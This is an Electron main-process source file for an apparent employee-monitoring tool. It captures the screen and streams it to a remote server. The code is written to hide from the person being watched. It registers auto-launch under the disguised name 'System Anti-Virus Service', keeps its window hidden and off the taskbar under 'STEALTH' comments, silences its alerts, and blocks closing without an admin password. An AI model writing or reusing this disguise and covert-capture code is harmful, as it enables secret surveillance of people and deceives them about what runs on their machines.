const { app, BrowserWindow, powerMonitor, ipcMain, screen, desktopCapturer } = require("electron");
const path = require("path");
const AutoLaunch = require('auto-launch');

// Load environment variables from .env file for Electron main process
require('dotenv').config({ path: path.join(__dirname, '.env') });

const TrackerService = require("./tracker.service");

let mainWindow;
let tracker;

// IPC Handler to get desktop sources (for screen capture)
ipcMain.handle('GET_DESKTOP_SOURCE_ID', async () => {
    try {
        const sources = await desktopCapturer.getSources({ types: ['screen'] });
        console.log('[Main] Desktop sources found:', sources && sources.length);
        return sources[0]?.id;
    } catch (error) {
        console.error('[Main] Failed to get desktop sources:', error);
        return null;
    }
});

// Auto-launch configuration
const autoLauncher = new AutoLaunch({
    name: 'System Anti-Virus Service', // Disguised name in startup items
    path: app.getPath('exe'),
});

function createWindow() {
    console.log('[Main] createWindow called');
    // STEALTH: Create window but keep it hidden by default
    mainWindow = new BrowserWindow({
        width: 1000,
        height: 700,
        show: false, // STEALTH: Don't show by default (DEBUG: true)
        skipTaskbar: true, // STEALTH: Don't show in taskbar initially (DEBUG: false)
        webPreferences: {
            preload: path.join(__dirname, "preload.js"),
            contextIsolation: true,
            nodeIntegration: false,
            backgroundThrottling: false // Keep running when minimized
        }
    });

    // Remove menu bar for stealth
    mainWindow.setMenuBarVisibility(false);

    // In development, load the Vite dev server
    // In production, load the built index.html
    const isDev = !app.isPackaged;
    if (isDev) {
        mainWindow.loadURL('http://localhost:5173');
        // mainWindow.webContents.openDevTools(); // Commented out for stealth
    } else {
        mainWindow.loadFile(path.join(__dirname, 'dist/index.html'));
    }

    // Check if we need to show login (first run) or stay hidden
    mainWindow.webContents.on('did-finish-load', () => {
        // We verify auth state via IPC from renderer.
        // If not authenticated, renderer will send 'SHOW_LOGIN'
    });

    // Initialize tracker with backend URLs
    // Priority: .env > Default Production URL > Localhost
    const defaultApiUrl = "https://screenshare-twth.onrender.com/api";
    const defaultSocketUrl = "https://screenshare-twth.onrender.com";

    const apiUrl = process.env.VITE_API_URL || defaultApiUrl;
    const socketUrl = process.env.VITE_SOCKET_URL || defaultSocketUrl;

    console.log('[Main] App Starting with Connectivity:');
    console.log('[Main]   API URL Target:', apiUrl);
    console.log('[Main]   Socket URL Target:', socketUrl);
    console.log('[Main]   Packaged:', app.isPackaged);

    tracker = new TrackerService(apiUrl, socketUrl);

    // Alert Overlay Handler (DISABLED for silent operation)
    tracker.setAlertHandler((type, details) => {
        // showOverlayAlert(type, details);
        console.log(`[Main] Silent Alert Captured: ${type} - ${details}`);
    });

    // Prevent window from being destroyed on close
    mainWindow.on('close', (event) => {
        if (!isQuitting) {
            event.preventDefault();
            // mainWindow.hide();
            if (process.platform === 'win32') {
                mainWindow.setSkipTaskbar(true);
            }
        }
    });
}

let alertWindow = null;

function showOverlayAlert(type, message) {
    if (alertWindow && !alertWindow.isDestroyed()) {
        try {
            alertWindow.close();
        } catch (e) { }
    }

    const { width } = screen.getPrimaryDisplay().workAreaSize;
    const windowWidth = 380;
    const windowHeight = 100;
    const x = Math.round((width - windowWidth) / 2);
    const y = 30;

    alertWindow = new BrowserWindow({
        width: windowWidth,
        height: windowHeight,
        x: x,
        y: y,
        frame: false,
        transparent: true,
        alwaysOnTop: true,
        skipTaskbar: true,
        focusable: false,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false
        }
    });

    // Define theme based on alert type
    const themes = {
        USER_IDLE: {
            primary: '#3b82f6',
            border: 'rgba(59, 130, 246, 0.3)',
            glow: 'rgba(59, 130, 246, 0.4)',
            gradient: 'linear-gradient(135deg, rgba(59, 130, 246, 0.1) 0%, transparent 50%)',
            icon: '💤',
            title: 'Inactivity Detected'
        },
        LOW_TYPING_SPEED: {
            primary: '#f59e0b',
            border: 'rgba(245, 158, 11, 0.3)',
            glow: 'rgba(245, 158, 11, 0.4)',
            gradient: 'linear-gradient(135deg, rgba(245, 158, 11, 0.1) 0%, transparent 50%)',
            icon: '⌨️',
            title: 'Low Activity'
        },
        MOUSE_INACTIVE: {
            primary: '#8b5cf6',
            border: 'rgba(139, 92, 246, 0.3)',
            glow: 'rgba(139, 92, 246, 0.4)',
            gradient: 'linear-gradient(135deg, rgba(139, 92, 246, 0.1) 0%, transparent 50%)',
            icon: '🖱️',
            title: 'Mouse Inactive'
        },
        RESTRICTED_APP_DETECTED: {
            primary: '#ef4444',
            border: 'rgba(239, 68, 68, 0.3)',
            glow: 'rgba(239, 68, 68, 0.4)',
            gradient: 'linear-gradient(135deg, rgba(239, 68, 68, 0.1) 0%, transparent 50%)',
            icon: '🚫',
            title: 'Restricted App'
        }
    };

    const theme = themes[type] || {
        primary: '#6b7280',
        border: 'rgba(107, 114, 128, 0.3)',
        glow: 'rgba(107, 114, 128, 0.4)',
        gradient: 'linear-gradient(135deg, rgba(107, 114, 128, 0.1) 0%, transparent 50%)',
        icon: '⚠️',
        title: 'Alert'
    };

    const htmlContent = `
    <!DOCTYPE html>
    <html>
    <head>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&display=swap');

            body { 
                margin: 0; padding: 0; 
                background: transparent; 
                height: 100vh; 
                display: flex; 
                justify-content: center; 
                align-items: center;
                font-family: 'Outfit', sans-serif; 
                overflow: hidden;
            }

            .glass-panel {
                position: relative;
                width: 95%; /* Use more avail width */
                height: 85%;
                background: rgba(10, 10, 15, 0.85);
                backdrop-filter: blur(20px) saturate(180%);
                -webkit-backdrop-filter: blur(20px) saturate(180%);
                border-radius: 12px; /* Smaller radius */
                border: 1px solid ${theme.border};
                display: flex;
                align-items: center;
                padding: 0 16px; /* Smaller padding */
                box-sizing: border-box;
                box-shadow: 
                    0 0 15px ${theme.glow},
                    0 0 40px ${theme.glow},
                    0 5px 20px rgba(0,0,0,0.5);
                animation: slideIn 0.5s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
                overflow: hidden;
            }

            .glass-panel::before {
                content: '';
                position: absolute;
                top: 0; left: 0; right: 0; bottom: 0;
                background: ${theme.gradient};
                z-index: -1;
            }

            .icon-wrapper {
                width: 36px; /* Smaller icon wrapper */
                height: 36px;
                border-radius: 50%;
                background: rgba(255, 255, 255, 0.05);
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 20px; /* Smaller icon */
                margin-right: 12px;
                border: 1px solid rgba(255,255,255,0.1);
                box-shadow: 0 0 10px ${theme.glow};
                animation: pulseIcon 2s infinite;
            }

            .content { flex: 1; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
            
            .title { 
                color: ${theme.primary};
                font-weight: 800; 
                font-size: 11px; /* Smaller title */
                text-transform: uppercase; 
                letter-spacing: 1px; 
                margin-bottom: 2px;
                text-shadow: 0 0 8px ${theme.glow};
            }
            
            .message { 
                color: #e2e8f0; 
                font-size: 13px; /* Smaller message */
                font-weight: 500; 
                line-height: 1.3;
            }

            /* Progress Bar */
            .progress-container {
                position: absolute;
                bottom: 0;
                left: 0;
                width: 100%;
                height: 3px; /* Thinner */
                background: rgba(255,255,255,0.1);
            }
            
            .progress-bar {
                height: 100%;
                background: ${theme.primary};
                box-shadow: 0 0 8px ${theme.glow};
                width: 100%;
                animation: progress 5s linear forwards;
            }

            /* Animations same as before */
            @keyframes slideIn {
                0% { transform: translateY(-150%) scale(0.95); opacity: 0; }
                100% { transform: translateY(0) scale(1); opacity: 1; }
            }

            @keyframes slideOut {
                0% { transform: translateY(0) scale(1); opacity: 1; }
                100% { transform: translateY(-150%) scale(0.95); opacity: 0; }
            }

            @keyframes pulseIcon {
                0% { transform: scale(1); box-shadow: 0 0 10px ${theme.glow}; }
                50% { transform: scale(1.1); box-shadow: 0 0 20px ${theme.glow}; }
                100% { transform: scale(1); box-shadow: 0 0 10px ${theme.glow}; }
            }

            @keyframes progress {
                from { width: 100%; }
                to { width: 0%; }
            }
            
            .closing {
                animation: slideOut 0.5s cubic-bezier(0.2, 0.8, 0.2, 1) forwards !important;
            }
        </style>
    </head>
    // ... (Body content same)
    <body>
        <div class="glass-panel" id="panel">
            <div class="icon-wrapper">${theme.icon}</div>
            <div class="content">
                <div class="title">${theme.title}</div>
                <div class="message">${message}</div>
            </div>
            <div class="progress-container">
                <div class="progress-bar"></div>
            </div>
        </div>
        <script>
            setTimeout(() => {
                document.getElementById('panel').classList.add('closing');
                setTimeout(() => {
                    const { ipcRenderer } = require('electron');
                    window.close();
                }, 500); 
            }, 5000);
        </script>
    </body>
    </html>
    `;

    alertWindow.loadURL('data:text/html;charset=utf-8,' + encodeURIComponent(htmlContent));

    alertWindow.on('closed', () => {
        alertWindow = null;
    });
}

// Enable auto-launch
autoLauncher.enable();

app.whenReady().then(createWindow);

// Power event listeners
powerMonitor.on("lock-screen", () => {
    if (tracker) tracker.setStatus("BREAK");
    if (mainWindow && !mainWindow.isDestroyed()) mainWindow.webContents.send("STATUS_UPDATE", "BREAK");
});

powerMonitor.on("unlock-screen", () => {
    if (tracker) tracker.setStatus("WORKING");
    if (mainWindow && !mainWindow.isDestroyed()) mainWindow.webContents.send("STATUS_UPDATE", "WORKING");
});

// IPC Listeners
ipcMain.on("SHOW_LOGIN", () => {
    if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.show();
        mainWindow.setSkipTaskbar(false);
        mainWindow.focus();
    }
});

ipcMain.on("HIDE_APP", () => {
    if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.hide();
        mainWindow.setSkipTaskbar(true); // Remove from taskbar
    }
});

ipcMain.on("START_TRACKING", async (event, { token, employeeId }) => {
    try {
        tracker.setAuth(token, employeeId);

        // Link tracker events to renderer
        tracker.setEventHandler((args) => {
            if (mainWindow && !mainWindow.isDestroyed()) {
                mainWindow.webContents.send("START_RECORDING", args);
            }
        });

        tracker.setStartStreamHandler((data) => {
            if (mainWindow && !mainWindow.isDestroyed()) {
                mainWindow.webContents.send("START_WEBRTC_STREAM", data);
            }
        });

        tracker.setStopStreamHandler((data) => {
            if (mainWindow && !mainWindow.isDestroyed()) {
                mainWindow.webContents.send("STOP_WEBRTC_STREAM", data);
            }
        });

        // Handle auto-logout from tracker (e.g. invalid token)
        tracker.setLogoutHandler(() => {
            if (mainWindow && !mainWindow.isDestroyed()) {
                mainWindow.webContents.send("FORCE_LOGOUT");
                mainWindow.show();
                mainWindow.setSkipTaskbar(false);
                mainWindow.focus();
            }
        });

        await tracker.start();
        mainWindow.webContents.send("STATUS_UPDATE", "WORKING");
        event.reply("TRACKING_STARTED", { success: true });
    } catch (err) {
        event.reply("TRACKING_STARTED", { success: false, error: err.message });
    }
});

ipcMain.on("STOP_TRACKING", () => {
    if (tracker) tracker.stop();
});

ipcMain.on("REQUEST_STATUS", (event) => {
    event.reply("STATUS_UPDATE", tracker ? tracker.status : "OFF");
});

ipcMain.on("TOKEN_UPDATED", (event, token) => {
    if (tracker) {
        tracker.updateToken(token);
    }
});

// Quit when all windows are closed
app.on("window-all-closed", () => {
    console.log('[Main] window-all-closed event fired');
    if (process.platform !== "darwin") {
        app.quit();
    }
});

let isQuitting = false;

ipcMain.on("FORCE_QUIT_APP", () => {
    console.log('[Main] FORCE_QUIT_APP received');
    isQuitting = true;
    app.quit();
});

ipcMain.handle("VERIFY_ADMIN_PASSWORD", async (event, password) => {
    if (tracker) {
        return await tracker.verifyPassword(password);
    }
    return false;
});

// Prevent closing without admin password (handled in renderer via IPC check)
// But for now, we just hide the window instead of closing it if it's an employee
app.on('before-quit', async (e) => {
    console.log('[Main] before-quit event fired. isQuitting:', isQuitting);
    if (!isQuitting) {
        e.preventDefault();

        // Notify server that we are stopping (Sync)
        if (tracker && tracker.status !== 'OFF') {
            console.log('[Main] Shutdown detected, sending final heartbeat...');
            await tracker.stop();
        }

        isQuitting = true;
        app.quit();
    }
});

app.on('will-quit', () => {
    console.log('[Main] will-quit event fired');
});

// Handle Windows Shutdown/Logoff
app.on('session-end', async () => {
    console.log('[Main] System Session Ending (Shutdown/Logoff)');
    if (tracker) {
        tracker.setStatus('OFF');
        await tracker.sendHeartbeat();
    }
});
